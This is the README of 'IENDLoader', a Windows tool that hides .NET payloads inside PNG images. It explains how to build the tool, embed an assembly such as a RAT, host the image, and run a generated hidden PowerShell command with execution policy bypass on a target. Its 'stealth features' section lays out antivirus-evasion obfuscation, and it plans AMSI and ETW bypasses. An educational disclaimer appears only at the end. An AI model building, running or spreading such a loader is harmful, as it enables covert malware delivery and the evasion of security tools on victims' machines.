# ⚡ IENDLoader (.NET Edition)

**Modern .NET WPF application for hiding .NET payloads in PNG images**

This is a complete rewrite of the Python version in C# with WPF, offering better performance, smaller file size, and native Windows integration.

---

## 🚀 Features

### Core Functionality
- **PNG Steganography**: Embeds .NET assemblies into PNG images using IEND chunk technique
- **PowerShell Generation**: Creates obfuscated one-liners for payload execution
- **Modern WPF UI**: Dark-themed, responsive interface with ModernWPF
- **Single-File Executable**: Self-contained, no dependencies required

### Stealth Features
- ✅ **No `-EncodedCommand`**: Uses direct `-Command` execution
- ✅ **Random Variable Names**: Different signature each generation
- ✅ **String Obfuscation**: Concatenated strings to break signatures
- ✅ **Dynamic Invocation**: Uses `.Invoke()` for method calls
- ✅ **Window Flag Obfuscation**: `-W 1` instead of `-W Hidden`
- ✅ **Auto/Manual Entry Points**: Flexible payload execution

---

## 📋 Requirements

### Development
- **.NET 8.0 SDK** or later
- **Windows** (for WPF)
- **Visual Studio 2022** or **VS Code** (optional)

### Runtime
- **None!** Single-file executable includes all dependencies

---

## 🔨 Building

### Windows (PowerShell)
```powershell
# Build Release version (recommended)
.\build.ps1

# Build Debug version
.\build.ps1 -Configuration Debug

# Build for different architectures
.\build.ps1 -Runtime win-x64    # 64-bit (default)
.\build.ps1 -Runtime win-x86    # 32-bit
.\build.ps1 -Runtime win-arm64  # ARM64
```

### Linux/macOS (Bash)
```bash
# Make script executable
chmod +x build.sh

# Build Release version
./build.sh

# Build for different architectures
./build.sh Release win-x64
./build.sh Release win-arm64
```

### Manual Build
```bash
# Restore dependencies
dotnet restore IENDLoader/IENDLoader.csproj

# Build
dotnet build IENDLoader/IENDLoader.csproj -c Release

# Publish single-file executable
dotnet publish IENDLoader/IENDLoader.csproj \
    -c Release \
    -r win-x64 \
    --self-contained true \
    -p:PublishSingleFile=true \
    -p:PublishTrimmed=true \
    -o publish/win-x64
```

**Output**: `publish/win-x64/IENDLoader.exe`

---

## 📖 Usage

### 1. Run the Application
```powershell
.\publish\win-x64\IENDLoader.exe
```

### 2. Workflow
1. **Select Payload** - Choose your .NET assembly (.exe or .dll)
2. **Select Image** - Choose a PNG cover image
3. **Embed** - Create weaponized image
4. **Configure Entry Point**:
   - **Auto-discovery** (default): Finds `Main()` automatically
   - **Manual**: Specify entry point (e.g., `Client.Program.Main`)
5. **Enter URL** - Where you'll host the weaponized image
6. **Generate** - Create PowerShell one-liner
7. **Copy** - Copy to clipboard
8. **Execute** - Run on target Windows machine

### 3. Host the Weaponized Image
```powershell
# Navigate to output directory
cd path\to\weaponized\image

# Start simple HTTP server
python -m http.server 8080
```

Or use any web server (IIS, Apache, nginx, etc.)

### 4. Execute on Target
```powershell
# Paste the generated PowerShell command
powershell.exe -NoP -NonI -W 1 -Exec Bypass -Command "..."
```

---

## 🎯 Entry Point Examples

### Auto-Discovery (Recommended)
- Automatically finds `Main()` method
- Works with most standard .NET assemblies
- May fail with heavily obfuscated payloads

### Manual Entry Points
```
Client.Program.Main          # AsyncRAT, Quasar RAT
Program.Main                 # Simple console apps
MyNamespace.MyClass.Main     # Custom namespace
Server.Core.Initialize       # Custom entry point
```

**Format**: `Namespace.Class.Method`

---

## 🔍 How It Works

### Embedding Process
1. Read cover PNG image
2. Read .NET assembly payload
3. Base64 encode payload
4. Wrap with markers: `BaseStart-{base64}-BaseEnd`
5. Append to PNG data (after IEND chunk)
6. Save weaponized image

### Execution Process
1. PowerShell downloads weaponized image
2. Extracts Base64 payload using regex
3. Decodes Base64 to byte array
4. Loads assembly with `[Reflection.Assembly]::Load()`
5. Finds entry point (auto or manual)
6. Invokes entry point with reflection

---

## 🛡️ Stealth Features Explained

### 1. No EncodedCommand
```powershell
# ❌ Old (Suspicious)
powershell.exe -EncodedCommand <BASE64>

# ✅ New (Stealthier)
powershell.exe -Command "..."
```

### 2. Random Variables
Each generation uses different variable names:
```powershell
# Run 1: $xy, $ab, $cd, $ef
# Run 2: $pq, $rs, $tu, $vw
# Run 3: $ij, $kl, $mn, $op
```

### 3. String Obfuscation
```powershell
# ❌ Plain
'BaseStart', 'Main', 'Load'

# ✅ Obfuscated
'Ba'+'se'+'Start', 'Ma'+'in', 'Lo'+'ad'
```

### 4. Dynamic Invocation
```powershell
# ❌ Direct call
[Convert]::FromBase64String($x)

# ✅ Dynamic invoke
[Convert]::('From'+'Base'+'64String').Invoke($x)
```

---

## 📊 Comparison: Python vs .NET

| Feature | Python Version | .NET Version |
|---------|---------------|--------------|
| **File Size** | ~50-100 MB (PyInstaller) | ~8-12 MB (single-file) |
| **Startup Time** | 2-3 seconds | <1 second |
| **Dependencies** | Python.dll + libraries | None (self-contained) |
| **AV Detection** | Higher (Python.dll flag) | Lower (native .exe) |
| **GUI Framework** | CustomTkinter | WPF (native) |
| **Obfuscation** | Limited | Excellent (ConfuserEx, etc.) |
| **Code Signing** | Difficult | Easy |
| **Performance** | Slower | Faster |

---

## 🔐 Advanced Usage

### Code Obfuscation
Use tools like **ConfuserEx** or **.NET Reactor** to obfuscate the builder:

```bash
# Example with ConfuserEx
ConfuserEx.Cli.exe -n IENDLoader.exe
```

### Code Signing
Sign the executable to appear more legitimate:

```powershell
# Self-signed certificate (testing)
$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=MyCompany"
Set-AuthenticodeSignature -FilePath IENDLoader.exe -Certificate $cert

# Commercial certificate (production)
signtool sign /f certificate.pfx /p password /tr http://timestamp.digicert.com IENDLoader.exe
```

---

## ⚠️ Limitations

### Still Detectable By:
- **Behavioral Analysis**: Downloading and executing assemblies
- **AMSI**: PowerShell script scanning (if enabled)
- **Network Monitoring**: HTTP downloads of suspicious files
- **Memory Scanning**: Assembly loading in memory
- **Advanced EDR**: Behavioral heuristics and ML models

### Not Bypassed:
- PowerShell script block logging
- PowerShell transcription logs
- Network IDS/IPS systems
- Sandbox/VM detection

---

## 🚧 Future Enhancements

### Planned Features
- [ ] **AMSI Bypass**: Patch AMSI before execution
- [ ] **ETW Patching**: Disable Event Tracing for Windows
- [ ] **Sandbox Detection**: VM/sandbox checks
- [ ] **Jitter/Delays**: Random sleep intervals
- [ ] **Proxy Support**: System proxy awareness
- [ ] **HTTPS Support**: Encrypted downloads
- [ ] **AES Encryption**: Additional payload encryption layer
- [ ] **Domain Fronting**: CDN-based delivery
- [ ] **Multiple Encodings**: XOR, RC4, etc.

---

## 📁 Project Structure

```
dotnet/
├── IENDLoader.sln              # Visual Studio solution
├── IENDLoader/
│   ├── IENDLoader.csproj       # Project file
│   ├── App.xaml                # WPF application
│   ├── App.xaml.cs
│   ├── MainWindow.xaml         # Main UI
│   ├── MainWindow.xaml.cs      # UI logic
│   ├── Core/
│   │   ├── PayloadEmbedder.cs  # Embedding logic
│   │   └── PowerShellGenerator.cs  # Command generation
│   └── Helpers/
│       └── NetworkHelper.cs    # Network utilities
├── build.ps1                   # Windows build script
├── build.sh                    # Linux/macOS build script
└── README.md                   # This file
```

---

## 🎓 Educational Value

This project demonstrates:
- **.NET WPF Development**: Modern UI patterns
- **Steganography**: PNG chunk manipulation
- **PowerShell Obfuscation**: AV evasion techniques
- **Reflection**: Dynamic assembly loading
- **Red Team Tactics**: Payload delivery methods

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This tool is provided for:
- Security research
- Authorized penetration testing
- Red team operations with written permission
- Educational purposes in controlled environments

**Unauthorized use is illegal and unethical. Always obtain proper authorization before testing.**

---

## 🤝 Contributing

This is an educational PoC. Feel free to:
- Report issues
- Suggest improvements
- Add stealth features
- Improve obfuscation

---

## 📝 License

Educational Use Only - Use responsibly and legally.

---

## 🔗 Resources

- [PNG Specification](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html)
- [PowerShell Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [.NET Reflection](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection)
- [AMSI Bypass Techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

---

**Built with ❤️ for the Red Team community**
